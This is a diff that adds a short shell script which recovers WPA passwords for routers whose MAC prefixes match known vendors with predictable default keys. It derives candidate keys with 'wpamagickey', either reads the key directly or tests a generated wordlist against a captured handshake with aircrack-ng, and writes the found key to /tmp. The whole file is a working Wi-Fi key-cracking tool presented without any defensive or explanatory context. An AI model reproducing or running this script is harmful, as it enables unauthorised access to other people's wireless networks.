@@ -1,0 +1,48 @@
+rm /tmp/$1* >/dev/null 2>/dev/null
+
+tipo_patron=0
+patron=$(echo $1 | grep "^00:1A:2B")
+if [ "$patron" != "" ] ; then
+	tipo_patron=1
+	wpamagickey $2 $1 /tmp/$1.txt >/dev/null 2>/dev/null
+fi
+
+patron=$(echo $1 | grep "^38:72:C0")
+patron2=$(echo $2 | grep "^WLAN")
+if [ "$patron" != "" -a "$patron2" != "" ] ; then
+	tipo_patron=2
+	wpamagickey $2 $1 /tmp/$1.txt >/dev/null 2>/dev/null
+fi
+
+patron=$(echo $1 | grep "^00:1D:20\|^64:68:0C\|^00:1F:A4\|^F4:3E:61")
+if [ "$patron" != "" ] ; then
+	tipo_patron=2
+	wpamagickey $2 $1 /tmp/$1.txt >/dev/null 2>/dev/null
+fi
+
+num_lineas=$(cat /tmp/$1.txt 2>/dev/null | wc -l)
+
+if [ $tipo_patron -eq 1 ] ; then
+	if [ $num_lineas -eq 258 ] ; then
+		aircrack-ng -q -1 -b $1 -w /tmp/$1.txt $3 > /tmp/$1.out
+		handshake=$(cat /tmp/$1.out | grep "No valid WPA handshakes found")
+		if [ "$handshake" != "" ] ; then
+			rm /tmp/$1* >/dev/null 2>/dev/null
+			echo "ERROR 2" > /tmp/$1.key
+			exit
+		fi
+	fi
+fi
+
+if [ $tipo_patron -eq 2 ] ; then
+	if [ $num_lineas -eq 3 ] ; then
+		clave=$(cat /tmp/$1.txt | tail -1)
+		rm /tmp/$1* >/dev/null 2>/dev/null
+		echo "$clave" > /tmp/$1.key
+		exit
+	fi
+fi
+
+rm /tmp/$1* >/dev/null 2>/dev/null
+echo "ERROR 1" > /tmp/$1.key
+exit
